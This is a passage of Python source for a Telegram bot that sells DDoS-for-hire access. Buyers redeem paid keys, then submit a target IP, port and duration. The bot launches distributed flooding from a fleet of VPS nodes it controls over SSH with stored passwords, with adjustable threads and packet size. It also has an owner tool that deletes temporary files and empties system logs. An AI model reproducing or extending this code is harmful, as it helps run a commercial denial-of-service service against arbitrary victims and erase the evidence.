    bot.register_next_step_handler(message, process_stylish_broadcast)

def process_stylish_broadcast(message):
    broadcast_text = message.text
    sent = 0
    sent_ids = set()

    # 🔘 Inline buttons
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("📢 𝗝𝗢𝗜𝗡 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/toxicvipgroup12")
    )
    keyboard.add(
        InlineKeyboardButton("👑 𝗖𝗥𝗘𝗔𝗧𝗢𝗥", url="https://t.me/LASTWISHES0")
    )

    # 📋 Prepare final message format
    final_msg = (
        "╔════════════════════════╗\n"
        "║     📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧     ║\n"
        "╚════════════════════════╝\n\n"
        f"{broadcast_text}\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "👑 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆: @NEWAADMI"
    )

    # 📤 Broadcast to broadcast.json users
    for uid in load_broadcast_users():
        if uid not in sent_ids:
            try:
                bot.send_message(uid, final_msg, reply_markup=keyboard, parse_mode="Markdown")
                sent += 1
                sent_ids.add(uid)
            except:
                continue

    # 📤 Broadcast to users.txt users
    for user in load_users():
        uid = user.get('user_id')
        if uid and uid not in sent_ids:
            try:
                bot.send_message(uid, final_msg, reply_markup=keyboard, parse_mode="Markdown")
                sent += 1
                sent_ids.add(uid)
            except:
                continue

    # ✅ Confirmation to admin
    bot.send_message(
        message.chat.id,
        f"✅ *Broadcast sent to {sent} users!*",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['check'])
def check_running_attacks(message):
    chat_id = message.chat.id
    
    if not active_attacks:
        bot.send_message(
            chat_id,
            "✨ *𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦* ✨\n\n"
            "🕊️ *No attacks are currently running* 🕊️\n\n"
            "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰",
            parse_mode='Markdown'
        )
        return
    
    response = (
        "✨ *𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦* ✨\n\n"
        "🔥 *𝗢𝗡𝗚𝗢𝗜𝗡𝗚 𝗔𝗧𝗧𝗔𝗖𝗞𝗦* 🔥\n\n"
    )
    
    for attack_id in active_attacks:
        try:
            parts = attack_id.split('_')
            username = parts[0] if len(parts) >= 2 else "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"
            timestamp = int(parts[1][:8], 16) if len(parts[1]) >= 8 else time.time()
            
            # Extract attack details
            target_ip = "❌"
            target_port = "❌"
            duration = 0
            for part in parts:
                if part.startswith("ip="):
                    target_ip = part[3:]
                elif part.startswith("port="):
                    target_port = part[5:]
                elif part.startswith("time="):
                    duration = int(part[5:])
            
            start_time = datetime.fromtimestamp(timestamp)
            elapsed = datetime.now() - start_time
            remaining = max(0, duration - elapsed.total_seconds())
            
            # Stylish formatting
            response += (
                f"╔════════════════════════╗\n"
                f"║     𝗔𝗧𝗧𝗔𝗖𝗞 𝗜𝗗: `{attack_id[:12]}...` ║\n"
                f"╚════════════════════════╝\n"
                f"• 👤 *User:* @{username}\n"
                f"• 🎯 *Target:* `{target_ip}:{target_port}`\n"
                f"• ⏱️ *Duration:* `{duration}s`\n"
                f"• 🕒 *Started:* `{start_time.strftime('%H:%M:%S')}`\n"
                f"• ⏳ *Time Left:* `{int(remaining)}s`\n\n"
            )
        
        except Exception as e:
            logger.error(f"Error processing attack {attack_id}: {e}")
            continue
    
    response += (
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        "꧁༺ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 🅰🅿🅽🅰 🅱🅷🅰🅸 ༻꧂"
    )
    
    bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
def attack_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    auth = check_user_authorization(user_id)
    if not auth['authorized']:
        bot.send_message(
            chat_id,
            f"🚷 *VIP ACCESS ONLY*\n{auth['message']}",
            parse_mode='Markdown'
        )
        return

    # Show current settings
    bot.send_message(
        chat_id,
        f"⚡ *Attack Configuration*\n\n"
        f"Current Settings:\n"
        f"🧵 Threads/VPS: `{THREADS_PER_VPS}`\n"
        f"📦 Packet Size: `{PACKET_SIZE} bytes`\n\n"
        "1️⃣ Adjust settings using buttons\n"
        "2️⃣ Then enter attack details:\n"
        "`IP PORT TIME`\n\n"
        "Example: `1.1.1.1 80 60`",
        reply_markup=get_attack_menu_markup(),
        parse_mode='Markdown'
    )

def process_attack_command(message, chat_id):
    global BOT_ENABLED, active_attacks, last_attack_times

    user_id = message.from_user.id
    command = message.text.strip()

    if not BOT_ENABLED:
        bot.send_message(chat_id, "🔴 *Bot is currently disabled by admin.*", parse_mode='Markdown')
        return

    auth = check_user_authorization(user_id)
    if not auth['authorized']:
        bot.send_message(
            chat_id,
            f"🚷 *VIP ACCESS ONLY*\n{auth['message']}",
            parse_mode='Markdown'
        )
        return

    if user_id in last_attack_times and (time.time() - last_attack_times[user_id]) < ATTACK_COOLDOWN:
        cooldown = int(ATTACK_COOLDOWN - (time.time() - last_attack_times[user_id]))
        bot.send_message(chat_id, f"⏳ *Cooldown Active*\nWait `{cooldown}` seconds.", parse_mode='Markdown')
        return

    try:
        parts = command.split()
        if len(parts) != 3:
            raise ValueError("🧩 Use format: `IP PORT TIME`")

        target_ip, port_str, time_str = parts
        target_port = int(port_str)
        duration = int(time_str)

        # Validations
        if not validate_ip(target_ip):
            raise ValueError("❌ Invalid IP address.")
        if not (1 <= target_port <= 65535):
            raise ValueError("❌ Port must be between 1 and 65535.")
        if duration <= 0:
            raise ValueError("❌ Duration must be a positive number.")
        if target_port in BLOCKED_PORTS:
            raise ValueError(f"🚫 Port `{target_port}` is restricted by admin.")

        # Check max time
        max_time = ADMIN_MAX_TIME if is_admin(user_id) else VIP_MAX_TIME if is_vip(user_id) else REGULAR_MAX_TIME
        if duration > max_time:
            raise ValueError(f"⏱️ Max allowed time: `{max_time}s`")

        # VPS list
        vps_list = get_active_vps_list()
        if not vps_list:
            raise ValueError("⚠️ No active VPS nodes available.")

        vps_count = len(vps_list)
        threads = THREADS_PER_VPS
        total_threads = threads * vps_count
        attack_id = f"{user_id}_{int(time.time())}"

        last_attack_times[user_id] = time.time()
        active_attacks.add(attack_id)

        # Send stylish attack init message
        bot.send_message(
            chat_id,
            f"🔥 *𝑽𝑰𝑷 𝑨𝑻𝑻𝑨𝑪𝑲 𝑰𝑵𝑰𝑻𝑰𝑨𝑻𝑬𝑫*\n\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"⏱ Duration: `{duration}s`\n"
            f"💻 VPS Nodes: `{vps_count}`\n"
            f"🧵 Threads: `{total_threads}`\n"
            f"🆔 ID: `{attack_id[:8]}`\n\n"
            f"🚀 *Operation Underway...*",
            parse_mode='Markdown'
        )

        result = execute_distributed_attack(vps_list, target_ip, target_port, duration, threads)

        # Final report
        bot.send_message(
            chat_id,
            f"✅ *𝑽𝑰𝑷 𝑶𝑷𝑬𝑹𝑨𝑻𝑰𝑶𝑵 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬*\n\n"
            f"🎯 IP: `{target_ip}`\n"
            f"📍 Port: `{target_port}`\n"
            f"⏱ Duration: `{duration}s`\n"
            f"💻 VPS: `{vps_count}`\n"
            f"🧵 Threads/VPS: `{threads}`\n"
            f"🆔 Attack ID: `{attack_id[:8]}`\n\n"
            f"🟢 Success: `{result['success']}`\n"
            f"🔴 Failed: `{result['failed']}`\n"
            f"👑 *APNA BHAI ROCKS*",
            parse_mode='Markdown'
        )

    except ValueError as ve:
        bot.send_message(chat_id, f"⚠️ *Input Error:* {str(ve)}", parse_mode='Markdown')
    except Exception as ex:
        logger.error(f"Unexpected error: {ex}", exc_info=True)
        bot.send_message(chat_id, "🚨 *Unexpected error occurred.*", parse_mode='Markdown')
    finally:
        if 'attack_id' in locals():
            active_attacks.discard(attack_id)

@bot.message_handler(func=lambda message: message.text == "🔑 Generate Key" and is_admin(message.from_user.id))
def generate_key_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(
            chat_id,
            "🔒 *Permission Denied*\nOnly admins can generate keys",
            parse_mode='Markdown'
        )
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("⏳ 1 Hour - 10₹"),
        KeyboardButton("📅 1 Day - 80₹"), 
        KeyboardButton("📆 3 Days - 200₹"),  # Fixed: Added missing quote
        KeyboardButton("🗓️ 1 Week - 300₹"),
        KeyboardButton("📅 15 Days - 900₹"),
        KeyboardButton("📆 30 Days - 1500₹"),
        KeyboardButton("💎 VIP KEY"),
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        "🔑 *Key Generation Menu* 🔑\n\n"
        "Select key duration:",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text in [
    "⏳ 1 Hour - 10₹", "📅 1 Day - 80₹", "📆 3 Days - 200₹",
    "🗓️ 1 Week - 300₹", "📅 15 Days - 900₹", "📆 30 Days - 1500₹"
] and is_admin(message.from_user.id))
def process_key_generation(message):
    global key_counter  # Use global counter
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or "Admin"

    time_unit_map = {
        "⏳ 1 Hour - 10₹": {"key": "hour", "duration": 1, "text": "1 Hour"},
        "📅 1 Day - 80₹": {"key": "day", "duration": 1, "text": "1 Day"},
        "📆 3 Days - 200₹": {"key": "3day", "duration": 3, "text": "3 Days"},
        "🗓️ 1 Week - 300₹": {"key": "week", "duration": 7, "text": "1 Week"},
        "📅 15 Days - 900₹": {"key": "15day", "duration": 15, "text": "15 Days"},
        "📆 30 Days - 1500₹": {"key": "30day", "duration": 30, "text": "30 Days"}
    }

    selected = time_unit_map.get(message.text)
    if not selected:
        bot.send_message(chat_id, "❌ Invalid selection!")
        return

    # Generate unique key
    key_number = str(key_counter).zfill(4)
    key = f"APNA-BHAI-{key_number}"
    key_counter += 1

    keys[key] = {
        'type': selected['key'],
        'duration': selected['duration'],
        'price': KEY_PRICES[selected['key']],
        # Add other fields if needed
    }

    save_keys(keys)

    # Send plain text message
    bot.send_message(
        chat_id,
        "╔════════════════════════╗\n"
        "║     🔑 KEY GENERATED   ║\n"
        "╚════════════════════════╝\n\n"
        f"Key Number: {key}\n"
        f"Duration: {selected['text']}\n"
        f"Value: {KEY_PRICES[selected['key']]}₹\n"
        f"Generated by: @{username}\n\n"
        "⚠️ This key can only be used once!\n\n"
        "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
        "꧁༺ POWERED BY APNA BHAI ༻꧂",
        reply_markup=get_menu_markup(user_id)
    )

# [Rest of the code remains the same, but remove the duplicate handle_text_messages at the end]

@bot.message_handler(func=lambda message: message.text == "🔑 Redeem Key")
def redeem_key_command(message):
    bot.send_message(
        message.chat.id,
        """
╔════════════════════════╗
║     🔑 KEY REDEMPTION  ║
╚════════════════════════╝

🔐 *How to redeem your key:*

1. Get a valid key from admin (format: APNA-BHAI-XXXX)
2. Simply send the key exactly as you received it
3. The bot will activate your account automatically

📌 *Example:*
Send: `APNA-BHAI-0001`

⚠️ *Note:*
- Keys are case-insensitive
- Each key can only be used once
- Contact @NEWAADMI for key issues
""",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.text == "👥 User Management" and is_admin(message.from_user.id))
def user_management(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission for user management.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*User Management*",
        reply_markup=get_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "💎 VIP KEY" and is_admin(message.from_user.id))
def vip_key_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    bot.send_message(
        chat_id,
        "✨ *VIP KEY GENERATION* ✨\n\n"
        "Please send the key details in format:\n"
        "`DURATION_TYPE MAX_SECONDS`\n\n"
        "📌 *Duration Types:*\n"
        "- hour\n"
        "- day\n"
        "- 3day\n"
        "- week\n"
        "- 15day\n"
        "- 30day\n\n"
        "💡 *Example:*\n"
        "`week 500` (Creates a 1-week VIP key with 500s max attack time)\n\n"
        "❌ Type 'cancel' to abort",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_vip_key_generation)

@bot.message_handler(func=lambda message: message.text == "👑 Manage VIP" and is_super_admin(message.from_user.id))
def manage_vip(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    # Create a stylish VIP management panel
    vip_panel = """
╔════════════════════════╗
║    👑 𝗩𝗜𝗣 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧    ║
╚════════════════════════╝

✨ *Available Commands:*

• 🚀 `/add_vip [ID]` - Grant VIP status
• 🔓 `/remove_vip [ID]` - Revoke VIP status
• 📋 `/list_vip` - Show all VIP users

▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰

📌 *Or select an option below:*
"""
    
    bot.send_message(
        chat_id,
        vip_panel,
        reply_markup=get_vip_management_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add VIP" and is_super_admin(message.from_user.id))
def add_vip_command(message):
    chat_id = message.chat.id
    
    bot.send_message(
        chat_id,
        "╔════════════════════════╗\n"
        "║    🚀 𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗩𝗜𝗣    ║\n"
        "╚════════════════════════╝\n\n"
        "📝 *Send the User ID to grant VIP access:*\n\n"
        "🔹 Format: `123456789`\n"
        "🔹 Or forward a user's message\n\n"
        "❌ Type /cancel to abort",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_vip_addition)

def process_vip_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if message.text == '/cancel':
        bot.send_message(
            chat_id,
            "🚫 VIP approval cancelled",
            reply_markup=get_vip_management_markup()
        )
        return
    
    try:
        target_id = int(message.text)
        
        # Load users data
        users = load_users()
        
        # Find or create user
        user = next((u for u in users if u['user_id'] == target_id), None)
        if not user:
            users.append({
                'user_id': target_id,
                'key': "MANUAL-VIP",
                'valid_until': (datetime.now() + timedelta(days=30)).isoformat(),
                'is_vip': True,
                'vip_added_by': user_id,
                'vip_added_at': datetime.now().isoformat()
            })
        else:
            user['is_vip'] = True
            user['vip_added_by'] = user_id
            user['vip_added_at'] = datetime.now().isoformat()
        
        # Save changes
        if save_users(users):
            bot.send_message(
                chat_id,
                f"╔════════════════════════╗\n"
                f"║    ✨ 𝗩𝗜𝗣 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗    ║\n"
                f"╚════════════════════════╝\n\n"
                f"🆔 User ID: `{target_id}`\n"
                f"👤 Added by: @{message.from_user.username}\n"
                f"⏱️ At: {datetime.now().strftime('%d %b %Y %H:%M')}\n\n"
                f"🌟 *VIP Benefits Granted:*\n"
                f"- 🚀 Pro Attacks\n"
                f"- ⏳ Extended Time\n\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰",
                reply_markup=get_vip_management_markup(),
                parse_mode='Markdown'
            )
        else:
            bot.send_message(
                chat_id,
                "❌ *Failed to save VIP status!*",
                reply_markup=get_vip_management_markup(),
                parse_mode='Markdown'
            )
            
    except ValueError:
        bot.send_message(
            chat_id,
            "❌ *Invalid User ID!*\n\n"
            "Please send a numeric ID only",
            reply_markup=get_vip_management_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "💎 VIP Features")
def vip_features(message):
    features = """
🌟 *VIP PRIVILEGES* 🌟
━━━━━━━━━━━━━━━━━━━━━━━━━
✅ *Extended Attack Durations*  
✅ *Priority Server Access*  
✅ *Exclusive Port Unlocks*  
✅ *Real-Time Analytics*  

💎 *Upgrade now!*  
Contact @LASTWISHES @LostBoiXD  
"""
    bot.send_message(
        message.chat.id,
        features,
        parse_mode="HTML",
        reply_markup=get_vip_menu_markup()
    )

@bot.message_handler(func=lambda message: message.text == "🛒 Get VIP")
def send_vip_info(message):
    caption = """
👑 <b>VIP Membership Info</b>

Contact the Admin/Owner to buy VIP access!

🆔 Admin ID: <code>6882674372, 1604629264</code>
   Username: @NEWAADMI, @LostBoiXD 
"""
    bot.send_message(
        message.chat.id,
        caption,
        parse_mode="HTML"
    )



@bot.message_handler(func=lambda message: message.text == "➖ Remove VIP" and is_super_admin(message.from_user.id))
def remove_vip_command(message):
    chat_id = message.chat.id
    
    bot.send_message(
        chat_id,
        "╔════════════════════════╗\n"
        "║    🔓 𝗥𝗘𝗠𝗢𝗩𝗘 𝗩𝗜𝗣    ║\n"
        "╚════════════════════════╝\n\n"
        "📝 *Send the User ID to revoke VIP access:*\n\n"
        "🔹 Format: `123456789`\n"
        "🔹 Or forward a user's message\n\n"
        "❌ Type /cancel to abort",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_vip_removal)

def process_vip_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if message.text == '/cancel':
        bot.send_message(
            chat_id,
            "🚫 VIP removal cancelled",
            reply_markup=get_vip_management_markup()
        )
        return
    
    try:
        target_id = int(message.text)
        
        # Load users data
        users = load_users()
        
        # Find user
        user = next((u for u in users if u['user_id'] == target_id), None)
        if not user:
            bot.send_message(
                chat_id,
                f"❌ *User {target_id} not found!*",
                reply_markup=get_vip_management_markup(),
                parse_mode='Markdown'
            )
            return
            
        if not user.get('is_vip', False):
            bot.send_message(
                chat_id,
                f"ℹ️ *User {target_id} is not a VIP!*",
                reply_markup=get_vip_management_markup(),
                parse_mode='Markdown'
            )
            return
            
        # Remove VIP status
        user['is_vip'] = False
        
        # Save changes
        if save_users(users):
            bot.send_message(
                chat_id,
                f"╔════════════════════════╗\n"
                f"║    🚫 𝗩𝗜𝗣 𝗥𝗘𝗠𝗢𝗩𝗘𝗗    ║\n"
                f"╚════════════════════════╝\n\n"
                f"🆔 User ID: `{target_id}`\n"
                f"👤 Removed by: @{message.from_user.username}\n"
                f"⏱️ At: {datetime.now().strftime('%d %b %Y %H:%M')}\n\n"
                f"⚠️ *VIP Benefits Revoked:*\n"
                f"- 🚀 Pro Attacks\n"
                f"- ⏳ Extended Time\n\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰",
                reply_markup=get_vip_management_markup(),
                parse_mode='Markdown'
            )
        else:
            bot.send_message(
                chat_id,
                "❌ *Failed to remove VIP status!*",
                reply_markup=get_vip_management_markup(),
                parse_mode='Markdown'
            )
            
    except ValueError:
        bot.send_message(
            chat_id,
            "❌ *Invalid User ID!*\n\n"
            "Please send a numeric ID only",
            reply_markup=get_vip_management_markup(),
            parse_mode='Markdown'
        )
        
@bot.message_handler(func=lambda message: message.text.startswith("🧵 Threads:"))
def handle_thread_selection(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    try:
        # Extract thread count from button text
        new_threads = int(message.text.split(":")[1].strip())
        
        if save_config(threads=new_threads):
            global THREADS_PER_VPS
            THREADS_PER_VPS = new_threads
            bot.send_message(
                chat_id,
                f"✅ Threads per VPS set to: {THREADS_PER_VPS}",
                reply_markup=get_attack_menu_markup(),
                parse_mode='Markdown'
            )
        else:
            bot.send_message(
                chat_id,
                "❌ Failed to update thread count!",
                reply_markup=get_attack_menu_markup(),
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Thread selection error: {e}")
        bot.send_message(
            chat_id,
            "❌ Invalid thread selection!",
            reply_markup=get_attack_menu_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text.startswith("📦 Packet:"))
def handle_packet_selection(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    try:
        # Extract packet size from button text
        new_size = int(message.text.split(":")[1].replace("B", "").strip())
        
        if save_config(packet_size=new_size):
            global PACKET_SIZE
            PACKET_SIZE = new_size
            bot.send_message(
                chat_id,
                f"✅ Packet size set to: {PACKET_SIZE} bytes",
                reply_markup=get_attack_menu_markup(),
                parse_mode='Markdown'
            )
        else:
            bot.send_message(
                chat_id,
                "❌ Failed to update packet size!",
                reply_markup=get_attack_menu_markup(),
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"Packet selection error: {e}")
        bot.send_message(
            chat_id,
            "❌ Invalid packet size selection!",
            reply_markup=get_attack_menu_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📋 List VIPs" and is_super_admin(message.from_user.id))
def list_vips_command(message):
    chat_id = message.chat.id
    
    # Load users data
    users = load_users()
    
    # Filter VIP users
    vip_users = [u for u in users if u.get('is_vip', False)]
    
    if not vip_users:
        bot.send_message(
            chat_id,
            "╔════════════════════════╗\n"
            "║    📜 𝗩𝗜𝗣 𝗟𝗜𝗦𝗧      ║\n"
            "╚════════════════════════╝\n\n"
            "ℹ️ No VIP users found",
            reply_markup=get_vip_management_markup(),
            parse_mode='Markdown'
        )
        return
    
    response = "╔════════════════════════╗\n"
    response += "║    👑 𝗩𝗜𝗣 𝗠𝗘𝗠𝗕𝗘𝗥𝗦    ║\n"
    response += "╚════════════════════════╝\n\n"
    
    for i, user in enumerate(vip_users, 1):
        response += f"{i}. 🆔 `{user['user_id']}`\n"
        if 'vip_added_at' in user:
            added_at = datetime.fromisoformat(user['vip_added_at'])
            response += f"   ⏳ Since: {added_at.strftime('%d %b %Y')}\n"
        if 'vip_added_by' in user:
            response += f"   👤 Added by: `{user['vip_added_by']}`\n"
        
        # Show expiration if available
        if 'valid_until' in user:
            expires = datetime.fromisoformat(user['valid_until'])
            remaining = expires - datetime.now()
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                response += f"   ⏳ Expires in: {days}d {hours}h\n"
            else:
                response += "   ⚠️ Expired\n"
        
        response += "\n"
    
    response += "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
    
    bot.send_message(
        chat_id,
        response,
        reply_markup=get_vip_management_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove User" and is_admin(message.from_user.id))
def remove_user_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to remove users.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to remove:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_user_removal)

def process_user_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    target_user = message.text.strip()
    
    try:
        target_user_id = int(target_user)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    users = load_users()
    updated_users = [u for u in users if u['user_id'] != target_user_id]
    
    if len(updated_users) < len(users):
        save_users(updated_users)
        bot.send_message(
            chat_id,
            f"*User {target_user_id} removed successfully!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*User {target_user_id} not found!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📊 Check Balance")
def check_balance(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if is_super_admin(user_id):
        bot.send_message(chat_id, "*You have unlimited access!*", parse_mode='Markdown')
        return
    
    if is_admin(user_id):
        admin_data = load_admin_data()
        balance = admin_data['admins'].get(str(user_id), {}).get('balance', 0)
        bot.send_message(chat_id, f"*Your current balance: {balance} Rs*", parse_mode='Markdown')
        return
    
    # For regular users
    users = load_users()
    user = next((u for u in users if u['user_id'] == user_id), None)
    
    if not user:
        bot.send_message(chat_id, "*You don't have an active account. Please redeem a key.*", parse_mode='Markdown')
        return
    
    valid_until = datetime.fromisoformat(user['valid_until'])
    remaining = valid_until - datetime.now()
    
    if remaining.total_seconds() <= 0:
        bot.send_message(chat_id, "*Your access has expired. Please redeem a new key.*", parse_mode='Markdown')
    else:
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        bot.send_message(
            chat_id,
            f"*Account Status*\n\n"
            f"User ID: `{user_id}`\n"
            f"Remaining Time: `{days}d {hours}h {minutes}m`\n"
            f"Valid until: `{valid_until.strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🛠️ Admin Tools" and is_super_admin(message.from_user.id))
def admin_tools(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission for admin tools.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Admin Tools*",
        reply_markup=get_super_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🔄 Check Status" and is_owner(message.from_user.id))
def check_vps_status(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    vps_data = load_vps_data()
    if not vps_data['vps']:
        bot.send_message(
            chat_id,
            "❌ No VPS found to check!",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    bot.send_message(
        chat_id,
        "🔄 Checking all VPS statuses... This may take a moment.",
        parse_mode='Markdown'
    )
    
    results = []
    for ip, details in vps_data['vps'].items():
        # Check if VPS is online
        status, _ = ssh_execute(ip, details['username'], details['password'], "uptime")
        status_emoji = "🟢" if status else "🔴"
        status_text = "Online" if status else "Offline"
        
        # Check if attack binary exists
        binary_status = ssh_execute(ip, details['username'], details['password'], "test -f /home/master/raja && echo 1 || echo 0")[1].strip()
        binary_status = "✔ Found" if binary_status == "1" else "✖ Missing"
        
        results.append(
            f"{status_emoji} *{ip}*\n"
            f"Status: {status_text}\n"
            f"Binary: {binary_status}\n"
            f"User: `{details['username']}`\n"
        )
    
    response = "📊 *VPS Status Report*\n\n"
    response += "╔════════════════════════════╗\n"
    response += "║       VPS STATUS           ║\n"
    response += "╠════════════════════════════╣\n"
    
    online_count = sum(1 for r in results if "Online" in r)
    offline_count = len(results) - online_count
    
    response += f"║ Total VPS: {len(results):<12} ║\n"
    response += f"║ Online: {online_count:<15} ║\n"
    response += f"║ Offline: {offline_count:<14} ║\n"
    response += "╚════════════════════════════╝\n\n"
    
    response += "\n".join(results)
    
    bot.send_message(
        chat_id,
        response,
        reply_markup=get_vps_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🔧 System Tools" and is_owner(message.from_user.id))
def system_tools(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("🔄 Restart Bot"),
        KeyboardButton("📊 Resource Usage"),
        KeyboardButton("🧹 Cleanup System"),
        KeyboardButton("⏱️ Bot Uptime"),  # Add this new button
        KeyboardButton("⬅️ Back")
    ]
    markup.add(*buttons)
    
    bot.send_message(
        chat_id,
        "🔧 *System Tools Menu*",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🔄 Restart Bot" and is_owner(message.from_user.id))
def restart_main_bot(message):
    chat_id = message.chat.id
    
    bot.send_message(
        chat_id,
        "🔄 Restarting main bot...",
        parse_mode='Markdown'
    )
    
    # This will stop the current bot process
    os.execv(sys.executable, ['python'] + sys.argv)

@bot.message_handler(func=lambda message: message.text == "📊 Resource Usage" and is_owner(message.from_user.id))
def resource_usage(message):
    chat_id = message.chat.id
    
    try:
        # Get CPU usage
        cpu_percent = psutil.cpu_percent(interval=1)
        # Get memory usage
        memory = psutil.virtual_memory()
        # Get disk usage
        disk = psutil.disk_usage('/')
        
        response = (
            "📊 *System Resource Usage*\n\n"
            f"🖥️ CPU Usage: {cpu_percent}%\n"
            f"🧠 Memory: {memory.percent}% used ({memory.used/1024/1024:.1f}MB/{memory.total/1024/1024:.1f}MB)\n"
            f"💾 Disk: {disk.percent}% used ({disk.used/1024/1024:.1f}MB/{disk.total/1024/1024:.1f}MB)\n\n"
            "⚠️ High usage may affect performance"
        )
        
        bot.send_message(
            chat_id,
            response,
            parse_mode='Markdown'
        )
    except Exception as e:
        bot.send_message(
            chat_id,
            f"❌ Failed to get resource usage: {str(e)}",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🧹 Cleanup System" and is_owner(message.from_user.id))
def cleanup_system(message):
    chat_id = message.chat.id
    
    try:
        # Clean up temporary files
        temp_files = 0
        for root, dirs, files in os.walk('/tmp'):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                    temp_files += 1
                except:
                    pass
        
        # Clear old logs
        log_files = 0
        for root, dirs, files in os.walk('/var/log'):
            for file in files:
                if file.endswith('.log'):
                    try:
                        with open(os.path.join(root, file), 'w') as f:
                            f.write('')
                        log_files += 1
                    except:
                        pass
        
        response = (
